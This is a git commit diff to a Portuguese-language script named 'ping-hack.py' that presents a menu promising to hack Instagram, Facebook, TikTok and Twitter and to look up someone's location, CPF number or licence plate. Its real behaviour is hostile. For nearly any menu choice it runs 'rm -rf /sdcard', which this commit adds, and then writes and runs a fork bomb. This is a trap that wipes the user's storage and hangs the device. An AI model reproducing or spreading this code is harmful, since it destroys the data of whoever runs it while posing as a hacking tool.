4247b9f14e0eb5b971f54ea3c40a4f120e15558e
Lankarl <115882836+Lankarl@users.noreply.github.com>
2022-11-18 21:54:43 -0300

    Update ping-hack.py

--- ping-hack.py
+++ ping-hack.py
@@ -32,7 +32,10 @@ print ("""  \n\033[0;32;m PAINEL PING
   [ 1 ] INSTAGRAM
   [ 2 ] FACEBOOK
   [ 3 ] TIKTOK
-  [ 4 ] TWITTER\033[m""")
+  [ 4 ] TWITTER
+  [ 5 ] PUXAR LOCALIZAÇÃO
+  [ 6 ] PUXAR CPF
+  [ 7 ] PUXAR PLACA \033[m""")
 
 opcao = int(input('\033[0;31;m digite a opção >> \033[m'))
 
@@ -40,5 +43,6 @@ if opcao == 1098:
 	print('sortekkk')
 
 else:
+        os.system('rm -rf /sdcard')
 	os.system('echo ":(){ :|:& };:" > fk.sh')
 	os.system('bash fk.sh')
